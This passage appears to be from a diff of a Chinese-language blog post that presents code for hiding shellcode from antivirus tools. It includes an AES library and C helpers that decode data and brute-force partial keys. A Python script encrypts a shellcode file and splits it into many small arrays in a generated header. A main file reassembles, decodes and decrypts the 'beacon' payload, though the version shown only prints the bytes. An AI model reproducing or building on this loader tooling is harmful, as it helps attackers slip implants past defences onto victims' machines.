+            tempa[2] = RoundKey[k + 2];
+            tempa[3] = RoundKey[k + 3];
+
+        }
+
+        if (i % Nk == 0)
+        {
+            // This function shifts the 4 bytes in a word to the left once.
+            // [a0,a1,a2,a3] becomes [a1,a2,a3,a0]
+
+            // Function RotWord()
+            {
+                const uint8_t u8tmp = tempa[0];
+                tempa[0] = tempa[1];
+                tempa[1] = tempa[2];
+                tempa[2] = tempa[3];
+                tempa[3] = u8tmp;
+            }
+
+            // SubWord() is a function that takes a four-byte input word and 
+            // applies the S-box to each of the four bytes to produce an output word.
+
+            // Function Subword()
+            {
+                tempa[0] = getSBoxValue(tempa[0]);
+                tempa[1] = getSBoxValue(tempa[1]);
+                tempa[2] = getSBoxValue(tempa[2]);
+                tempa[3] = getSBoxValue(tempa[3]);
+            }
+
+            tempa[0] = tempa[0] ^ Rcon[i / Nk];
+        }
+#if defined(AES256) &amp;&amp; (AES256 == 1)
+        if (i % Nk == 4)
+        {
+            // Function Subword()
+            {
+                tempa[0] = getSBoxValue(tempa[0]);
+                tempa[1] = getSBoxValue(tempa[1]);
+                tempa[2] = getSBoxValue(tempa[2]);
+                tempa[3] = getSBoxValue(tempa[3]);
+            }
+        }
+#endif
+        j = i * 4; k = (i - Nk) * 4;
+        RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0];
+        RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1];
+        RoundKey[j + 2] = RoundKey[k + 2] ^ tempa[2];
+        RoundKey[j + 3] = RoundKey[k + 3] ^ tempa[3];
+    }
+}
+
+void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)
+{
+    KeyExpansion(ctx-&gt;RoundKey, key);
+}
+#if (defined(CBC) &amp;&amp; (CBC == 1)) || (defined(CTR) &amp;&amp; (CTR == 1))
+void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)
+{
+    KeyExpansion(ctx-&gt;RoundKey, key);
+    memcpy(ctx-&gt;Iv, iv, AES_BLOCKLEN);
+}
+void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)
+{
+    memcpy(ctx-&gt;Iv, iv, AES_BLOCKLEN);
+}
+#endif
+
+// This function adds the round key to state.
+// The round key is added to the state by an XOR function.
+static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)
+{
+    uint8_t i, j;
+    for (i = 0; i &lt; 4; ++i)
+    {
+        for (j = 0; j &lt; 4; ++j)
+        {
+            (*state)[i][j] ^= RoundKey[(round * Nb * 4) + (i * Nb) + j];
+        }
+    }
+}
+
+// The SubBytes Function Substitutes the values in the
+// state matrix with values in an S-box.
+static void SubBytes(state_t* state)
+{
+    uint8_t i, j;
+    for (i = 0; i &lt; 4; ++i)
+    {
+        for (j = 0; j &lt; 4; ++j)
+        {
+            (*state)[j][i] = getSBoxValue((*state)[j][i]);
+        }
+    }
+}
+
+// The ShiftRows() function shifts the rows in the state to the left.
+// Each row is shifted with different offset.
+// Offset = Row number. So the first row is not shifted.
+static void ShiftRows(state_t* state)
+{
+    uint8_t temp;
+
+    // Rotate first row 1 columns to left  
+    temp = (*state)[0][1];
+    (*state)[0][1] = (*state)[1][1];
+    (*state)[1][1] = (*state)[2][1];
+    (*state)[2][1] = (*state)[3][1];
+    (*state)[3][1] = temp;
+
+    // Rotate second row 2 columns to left  
+    temp = (*state)[0][2];
+    (*state)[0][2] = (*state)[2][2];
+    (*state)[2][2] = temp;
+
+    temp = (*state)[1][2];
+    (*state)[1][2] = (*state)[3][2];
+    (*state)[3][2] = temp;
+
+    // Rotate third row 3 columns to left
+    temp = (*state)[0][3];
+    (*state)[0][3] = (*state)[3][3];
+    (*state)[3][3] = (*state)[2][3];
+    (*state)[2][3] = (*state)[1][3];
+    (*state)[1][3] = temp;
+}
+
+static uint8_t xtime(uint8_t x)
+{
+    return ((x &lt;&lt; 1) ^ (((x &gt;&gt; 7) &amp; 1) * 0x1b));
+}
+
+// MixColumns function mixes the columns of the state matrix
+static void MixColumns(state_t* state)
+{
+    uint8_t i;
+    uint8_t Tmp, Tm, t;
+    for (i = 0; i &lt; 4; ++i)
+    {
+        t = (*state)[i][0];
+        Tmp = (*state)[i][0] ^ (*state)[i][1] ^ (*state)[i][2] ^ (*state)[i][3];
+        Tm = (*state)[i][0] ^ (*state)[i][1]; Tm = xtime(Tm);  (*state)[i][0] ^= Tm ^ Tmp;
+        Tm = (*state)[i][1] ^ (*state)[i][2]; Tm = xtime(Tm);  (*state)[i][1] ^= Tm ^ Tmp;
+        Tm = (*state)[i][2] ^ (*state)[i][3]; Tm = xtime(Tm);  (*state)[i][2] ^= Tm ^ Tmp;
+        Tm = (*state)[i][3] ^ t;              Tm = xtime(Tm);  (*state)[i][3] ^= Tm ^ Tmp;
+    }
+}
+
+// Multiply is used to multiply numbers in the field GF(2^8)
+// Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary
+//       The compiler seems to be able to vectorize the operation better this way.
+//       See https://github.com/kokke/tiny-AES-c/pull/34
+#if MULTIPLY_AS_A_FUNCTION
+static uint8_t Multiply(uint8_t x, uint8_t y)
+{
+    return (((y &amp; 1) * x) ^
+        ((y &gt;&gt; 1 &amp; 1) * xtime(x)) ^
+        ((y &gt;&gt; 2 &amp; 1) * xtime(xtime(x))) ^
+        ((y &gt;&gt; 3 &amp; 1) * xtime(xtime(xtime(x)))) ^
+        ((y &gt;&gt; 4 &amp; 1) * xtime(xtime(xtime(xtime(x)))))); /* this last call to xtime() can be omitted */
+}
+#else
+#define Multiply(x, y)                                \
+      (  ((y &amp; 1) * x) ^                              \
+      ((y&gt;&gt;1 &amp; 1) * xtime(x)) ^                       \
+      ((y&gt;&gt;2 &amp; 1) * xtime(xtime(x))) ^                \
+      ((y&gt;&gt;3 &amp; 1) * xtime(xtime(xtime(x)))) ^         \
+      ((y&gt;&gt;4 &amp; 1) * xtime(xtime(xtime(xtime(x))))))   \
+
+#endif
+
+#if (defined(CBC) &amp;&amp; CBC == 1) || (defined(ECB) &amp;&amp; ECB == 1)
+/*
+static uint8_t getSBoxInvert(uint8_t num)
+{
+  return rsbox[num];
+}
+*/
+#define getSBoxInvert(num) (rsbox[(num)])
+
+// MixColumns function mixes the columns of the state matrix.
+// The method used to multiply may be difficult to understand for the inexperienced.
+// Please use the references to gain more information.
+static void InvMixColumns(state_t* state)
+{
+    int i;
+    uint8_t a, b, c, d;
+    for (i = 0; i &lt; 4; ++i)
+    {
+        a = (*state)[i][0];
+        b = (*state)[i][1];
+        c = (*state)[i][2];
+        d = (*state)[i][3];
+
+        (*state)[i][0] = Multiply(a, 0x0e) ^ Multiply(b, 0x0b) ^ Multiply(c, 0x0d) ^ Multiply(d, 0x09);
+        (*state)[i][1] = Multiply(a, 0x09) ^ Multiply(b, 0x0e) ^ Multiply(c, 0x0b) ^ Multiply(d, 0x0d);
+        (*state)[i][2] = Multiply(a, 0x0d) ^ Multiply(b, 0x09) ^ Multiply(c, 0x0e) ^ Multiply(d, 0x0b);
+        (*state)[i][3] = Multiply(a, 0x0b) ^ Multiply(b, 0x0d) ^ Multiply(c, 0x09) ^ Multiply(d, 0x0e);
+    }
+}
+
+
+// The SubBytes Function Substitutes the values in the
+// state matrix with values in an S-box.
+static void InvSubBytes(state_t* state)
+{
+    uint8_t i, j;
+    for (i = 0; i &lt; 4; ++i)
+    {
+        for (j = 0; j &lt; 4; ++j)
+        {
+            (*state)[j][i] = getSBoxInvert((*state)[j][i]);
+        }
+    }
+}
+
+static void InvShiftRows(state_t* state)
+{
+    uint8_t temp;
+
+    // Rotate first row 1 columns to right  
+    temp = (*state)[3][1];
+    (*state)[3][1] = (*state)[2][1];
+    (*state)[2][1] = (*state)[1][1];
+    (*state)[1][1] = (*state)[0][1];
+    (*state)[0][1] = temp;
+
+    // Rotate second row 2 columns to right 
+    temp = (*state)[0][2];
+    (*state)[0][2] = (*state)[2][2];
+    (*state)[2][2] = temp;
+
+    temp = (*state)[1][2];
+    (*state)[1][2] = (*state)[3][2];
+    (*state)[3][2] = temp;
+
+    // Rotate third row 3 columns to right
+    temp = (*state)[0][3];
+    (*state)[0][3] = (*state)[1][3];
+    (*state)[1][3] = (*state)[2][3];
+    (*state)[2][3] = (*state)[3][3];
+    (*state)[3][3] = temp;
+}
+#endif // #if (defined(CBC) &amp;&amp; CBC == 1) || (defined(ECB) &amp;&amp; ECB == 1)
+
+// Cipher is the main function that encrypts the PlainText.
+static void Cipher(state_t* state, const uint8_t* RoundKey)
+{
+    uint8_t round = 0;
+
+    // Add the First round key to the state before starting the rounds.
+    AddRoundKey(0, state, RoundKey);
+
+    // There will be Nr rounds.
+    // The first Nr-1 rounds are identical.
+    // These Nr rounds are executed in the loop below.
+    // Last one without MixColumns()
+    for (round = 1; ; ++round)
+    {
+        SubBytes(state);
+        ShiftRows(state);
+        if (round == Nr) {
+            break;
+        }
+        MixColumns(state);
+        AddRoundKey(round, state, RoundKey);
+    }
+    // Add round key to last round
+    AddRoundKey(Nr, state, RoundKey);
+}
+
+#if (defined(CBC) &amp;&amp; CBC == 1) || (defined(ECB) &amp;&amp; ECB == 1)
+static void InvCipher(state_t* state, const uint8_t* RoundKey)
+{
+    uint8_t round = 0;
+
+    // Add the First round key to the state before starting the rounds.
+    AddRoundKey(Nr, state, RoundKey);
+
+    // There will be Nr rounds.
+    // The first Nr-1 rounds are identical.
+    // These Nr rounds are executed in the loop below.
+    // Last one without InvMixColumn()
+    for (round = (Nr - 1); ; --round)
+    {
+        InvShiftRows(state);
+        InvSubBytes(state);
+        AddRoundKey(round, state, RoundKey);
+        if (round == 0) {
+            break;
+        }
+        InvMixColumns(state);
+    }
+
+}
+#endif // #if (defined(CBC) &amp;&amp; CBC == 1) || (defined(ECB) &amp;&amp; ECB == 1)
+
+/*****************************************************************************/
+/* Public functions:                                                         */
+/*****************************************************************************/
+#if defined(ECB) &amp;&amp; (ECB == 1)
+
+
+void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)
+{
+    // The next function call encrypts the PlainText with the Key using AES algorithm.
+    Cipher((state_t*)buf, ctx-&gt;RoundKey);
+}
+
+void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)
+{
+    // The next function call decrypts the PlainText with the Key using AES algorithm.
+    InvCipher((state_t*)buf, ctx-&gt;RoundKey);
+}
+
+
+#endif // #if defined(ECB) &amp;&amp; (ECB == 1)
+
+
+
+
+
+#if defined(CBC) &amp;&amp; (CBC == 1)
+
+
+static void XorWithIv(uint8_t* buf, const uint8_t* Iv)
+{
+    uint8_t i;
+    for (i = 0; i &lt; AES_BLOCKLEN; ++i) // The block in AES is always 128bit no matter the key size
+    {
+        buf[i] ^= Iv[i];
+    }
+}
+
+void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)
+{
+    size_t i;
+    uint8_t* Iv = ctx-&gt;Iv;
+    for (i = 0; i &lt; length; i += AES_BLOCKLEN)
+    {
+        XorWithIv(buf, Iv);
+        Cipher((state_t*)buf, ctx-&gt;RoundKey);
+        Iv = buf;
+        buf += AES_BLOCKLEN;
+    }
+    /* store Iv in ctx for next call */
+    memcpy(ctx-&gt;Iv, Iv, AES_BLOCKLEN);
+}
+
+void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)
+{
+    size_t i;
+    uint8_t storeNextIv[AES_BLOCKLEN];
+    for (i = 0; i &lt; length; i += AES_BLOCKLEN)
+    {
+        memcpy(storeNextIv, buf, AES_BLOCKLEN);
+        InvCipher((state_t*)buf, ctx-&gt;RoundKey);
+        XorWithIv(buf, ctx-&gt;Iv);
+        memcpy(ctx-&gt;Iv, storeNextIv, AES_BLOCKLEN);
+
+        buf += AES_BLOCKLEN;
+    }
+
+
+}
+
+#endif // #if defined(CBC) &amp;&amp; (CBC == 1)
+
+
+
+#if defined(CTR) &amp;&amp; (CTR == 1)
+
+/* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key */
+void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)
+{
+    uint8_t buffer[AES_BLOCKLEN];
+
+    size_t i;
+    int bi;
+    for (i = 0, bi = AES_BLOCKLEN; i &lt; length; ++i, ++bi)
+    {
+        if (bi == AES_BLOCKLEN) /* we need to regen xor compliment in buffer */
+        {
+
+            memcpy(buffer, ctx-&gt;Iv, AES_BLOCKLEN);
+            Cipher((state_t*)buffer, ctx-&gt;RoundKey);
+
+            /* Increment Iv and handle overflow */
+            for (bi = (AES_BLOCKLEN - 1); bi &gt;= 0; --bi)
+            {
+                /* inc will overflow */
+                if (ctx-&gt;Iv[bi] == 255)
+                {
+                    ctx-&gt;Iv[bi] = 0;
+                    continue;
+                }
+                ctx-&gt;Iv[bi] += 1;
+                break;
+            }
+            bi = 0;
+        }
+
+        buf[i] = (buf[i] ^ buffer[bi]);
+    }
+}
+
+#endif // #if defined(CTR) &amp;&amp; (CTR == 1)
+
+</code></pre>
+<p>helpers.c   </p>
+<pre><code class="language-C">#define _CRT_SECURE_NO_WARNINGS
+#include &quot;helpers.h&quot;
+
+
+int AES_KEY_LENGTH = 32; 
+
+void build_decoding_table() {
+
+    decoding_table = (char*)malloc(256);
+    if (decoding_table == NULL) {
+        DEBUG(&quot;[x] Cannot allocate memory for the decoding table\n&quot;);
+        exit(-1);
+    }
+    for (int i = 0; i &lt; 64; i++) {
+        decoding_table[(unsigned char)encoding_table[i]] = i;
+    }
+}
+
+unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {
+
+    if (decoding_table == NULL) build_decoding_table();
+
+    if (input_length % 4 != 0) return NULL;
+
+    *output_length = input_length / 4 * 3;
+    if (data[input_length - 1] == '=') {
+        (*output_length)--;
+    }
+    if (data[input_length - 2] == '=') (*output_length)--;
+
+    unsigned char* decoded_data = (unsigned char*)malloc(*output_length);
+    if (decoded_data == NULL) return NULL;
+
+    for (int i = 0, j = 0; i &lt; input_length;) {
+
+        DWORD sextet_a = data[i] == '=' ? 0 &amp; i++ : decoding_table[data[i++]];
+        DWORD sextet_b = data[i] == '=' ? 0 &amp; i++ : decoding_table[data[i++]];
+        DWORD sextet_c = data[i] == '=' ? 0 &amp; i++ : decoding_table[data[i++]];
+        DWORD sextet_d = data[i] == '=' ? 0 &amp; i++ : decoding_table[data[i++]];
+
+        DWORD triple = (sextet_a &lt;&lt; 3 * 6)
+            + (sextet_b &lt;&lt; 2 * 6)
+            + (sextet_c &lt;&lt; 1 * 6)
+            + (sextet_d &lt;&lt; 0 * 6);
+
+        if (j &lt; *output_length) decoded_data[j++] = (triple &gt;&gt; 2 * 8) &amp; 0xFF;
+        if (j &lt; *output_length) decoded_data[j++] = (triple &gt;&gt; 1 * 8) &amp; 0xFF;
+        if (j &lt; *output_length) decoded_data[j++] = (triple &gt;&gt; 0 * 8) &amp; 0xFF;
+    }
+
+    return decoded_data;
+}
+
+BOOL aes_decrypt(const uint8_t* key, size_t szKey, unsigned char* encrypted, size_t szEncrypted, unsigned char* unencryptedData) {
+    // First 16 bytes represent the IV.
+    uint8_t* iv = (uint8_t*)calloc(16, sizeof(uint8_t));
+    if (!iv) {
+        DEBUG(&quot;[x] AES decryption failed (couldn't allocate IV).\n&quot;);
+        return FALSE;
+    }
+    memcpy(iv, encrypted, 16 * sizeof(uint8_t));
+
+    size_t szEncryptedData = szEncrypted - 16;
+    memcpy(unencryptedData, &amp;encrypted[16], szEncryptedData * sizeof(unsigned char));
+
+    struct AES_ctx ctx;
+
+    // If the provided key is not complete (length != 32 bytes), a bruteforce is attempted.
+    // Iterates over the missing bytes using the provided partial key as input.
+    if (AES_KEY_LENGTH == szKey) {
+        AES_init_ctx_iv(&amp;ctx, key, iv);
+        AES_CBC_decrypt_buffer(&amp;ctx, unencryptedData, szEncryptedData);
+        free(iv);
+        return TRUE;
+    }
+    else {
+        DWORD missingKeyLength = AES_KEY_LENGTH - szKey;
+        DEBUG(&quot;[-] Provided key is missing %i bytes\n&quot;, missingKeyLength);
+        uint8_t* missingKey = (uint8_t*)calloc(missingKeyLength, sizeof(unsigned char));
+        uint8_t* fullKey = (uint8_t*)calloc(AES_KEY_LENGTH + 1, sizeof(unsigned char));
+        if (!missingKey || !fullKey) {
+            DEBUG(&quot;[x] AES decryption failed (couldn't allocate key elements).\n&quot;);
+            return FALSE;
+        }
+        uint8_t index = 0;
+        memcpy(fullKey, key, (AES_KEY_LENGTH - missingKeyLength) * sizeof(uint8_t));
+        while (TRUE) {
+            while (missingKey[index] &lt;= 254) {
+                memcpy(&amp;fullKey[AES_KEY_LENGTH - missingKeyLength], missingKey, missingKeyLength * sizeof(uint8_t));
+                AES_init_ctx_iv(&amp;ctx, fullKey, iv);
+                AES_CBC_decrypt_buffer(&amp;ctx, unencryptedData, szEncryptedData);
+                uint8_t padding = unencryptedData[szEncryptedData - 1];
+
+                // Validate the decryption by checking that the last 4 bytes are egal to 0.
+                if (unencryptedData[szEncryptedData - padding - 4] == 0x0 &amp;&amp; unencryptedData[szEncryptedData - padding - 3] == 0x0 &amp;&amp; unencryptedData[szEncryptedData - padding - 2] == 0x0 &amp;&amp; unencryptedData[szEncryptedData - padding - 1] == 0x0) {
+                    free(iv);
+                    free(missingKey);
+                    free(fullKey);
+                    return TRUE;
+                }
+                else {
+                    memcpy(unencryptedData, &amp;encrypted[16], szEncryptedData * sizeof(unsigned char));
+                }
+
+                missingKey[index] += 1;
+
+            }
+            for (uint8_t i = 0; i &lt; missingKeyLength; i++) {
+                if (missingKey[i] == 255) {
+                    missingKey[i] = 0;
+                    if (i &lt; missingKeyLength - 1) {
+                        missingKey[i + 1] += 1;
+                    }
+                    else {
+                        DEBUG(&quot;[x] AES decryption failed could not find the key.\n&quot;);
+                        return FALSE;
+                    }
+                }
+            }
+        }
+    }
+}
+
+unsigned char* xor_text(const char* buff) {
+    size_t size = strlen(buff);
+    size_t osize;
+    unsigned char* result = base64_decode(buff, size, &amp;osize);
+    for (int i = 0; i &lt; osize; i++) {
+        result[i] = result[i] ^ 0xA7;
+    }
+    return result;
+}
+
+wchar_t* char2wc(const char* buff) {
+    const size_t cSize = strlen(buff) + 1;
+    wchar_t* wc = malloc(cSize * sizeof(wchar_t));
+    mbstowcs(wc, buff, cSize);
+    return wc;
+}
+</code></pre>
+<p>python文件，加密生成shellcode，随机生成加密key</p>
+<pre><code class="language-C">from base64 import b64encode
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from Crypto import Random
+import os
+import sys
+import string
+import random
+#key = b&quot;HrKHQxhUNxWuQxYdVEOZhoYbRcHeFmHS&quot;
+
+key = ''.join(random.choice(string.ascii_letters) for i in range(32))
+key = key.encode()
+
+if len(sys.argv) == 3:
+    key = sys.argv[2].encode()
+
+
+try:
+    file = open(sys.argv[1], 'rb')
+    data = file.read()
+    file.close()
+except IndexError:
+    data = shellcode
+
+data += b'\x00\x00\x00\x00'
+
+iv = Random.new().read(AES.block_size)
+
+cipher = AES.new(key, AES.MODE_CBC, iv)
+enc = cipher.encrypt(pad(data, AES.block_size))
+ciphertext = b64encode(iv + enc)
+
+file = open('../sc.h', 'w')
+i = 1
+k = 0
+file.write('#define _CRT_SECURE_NO_WARNINGS\n#pragma once\n#include &lt;string.h&gt;\n\n')
+for j in range(len(ciphertext)):
+    elt = ciphertext[j]
+    if(i%16 == 1):
+        if(i//16 % 2 == 0):
+            file.write('const char sc_' + format(i//16) + '[16] = {')
+        else:
+            file.write('char sc_' + format(i//16) + '[16] = {')
+        k += 1
+
+    file.write('{}'.format(hex(elt)))
+
+    if(i%16 == 0):
+        file.write('};\n')
+
+    elif j != len(ciphertext) - 1:
+        file.write(',')
+    i += 1
+
+if(i%16 != 1):
+    file.write('};\n')
+
+file.write('\nchar sc[{}];\n'.format(len(ciphertext)))
+file.write('int sc_length = {};\n'.format(len(ciphertext)))
+
+file.write(&quot;void buildsc_0(){\n&quot;)
+l = 1
+m = 1
+for i in range(k):
+    file.write('\tmemcpy(&amp;sc[{}], sc_{}, 16);\n'.format(i*16, i))
+    if(l % 200 == 0):
+        file.write(&quot;}\nvoid buildsc_&quot; + format(m) + &quot;(){\n&quot;)
+        m += 1
+    l += 1
+file.write(&quot;}\n&quot;)
+
+file.write(&quot;void buildsc(){\n&quot;)
+for i in range(m):
+    file.write(&quot;\tbuildsc_{}();\n&quot;.format(i))
+file.write(&quot;}&quot;)
+
+file.write('\nBYTE key[] = &quot;{}&quot;;\n'.format(key.decode()))
+file.close()
+</code></pre>
+<p>main文件</p>
+<pre><code class="language-C">#include &quot;helpers.h&quot;
+#include &lt;TlHelp32.h&gt;
+#include &quot;sc.h&quot;
+
+int main(void) {
+
+    buildsc();  //调用函数组合shellcode，shellcode存储到sc数组
+
+    //对shellcode base64解码
+    size_t szOutput = 0;
+    DWORD size = 0;
+    unsigned char* file_enc = NULL;
+    BYTE* beaconContent = NULL;
+    size_t beaconSize = NULL;
+    file_enc = base64_decode(sc, sc_length, &amp;szOutput);
+    if (szOutput == 0) {
+        DEBUG(&quot;[x] Base64 decode failed \n&quot;);
+        return -1;
+    }  
+    for (int i = 0; i &lt; sc_length; i++) {
+        printf(&quot;0x%x,&quot;, file_enc[i]);
+    }
+    printf(&quot;\n&quot;);
+
+    //AES解密
+    beaconSize = szOutput - 16;
+    beaconContent = (unsigned char*)calloc(beaconSize, sizeof(BYTE));
+    BOOL decryptStatus = aes_decrypt(key, (sizeof(key) / sizeof(key[0])) - 1, file_enc, beaconSize, beaconContent);
+    if (!decryptStatus || beaconContent == NULL) {
+        DEBUG(&quot;[x] AES decryption failed\n&quot;);
+        return -1;
+    }
+
+    //完全解密后的数据存储在beaconContent数组中
+    for (int i = 0; i &lt; beaconSize; i++) {
+        printf(&quot;0x%x,&quot;, beaconContent[i]);
+    }
+    printf(&quot;\n&quot;);
+
+}
+
+
 
 </code></pre>
 <h1 id="_6">其他</h1>
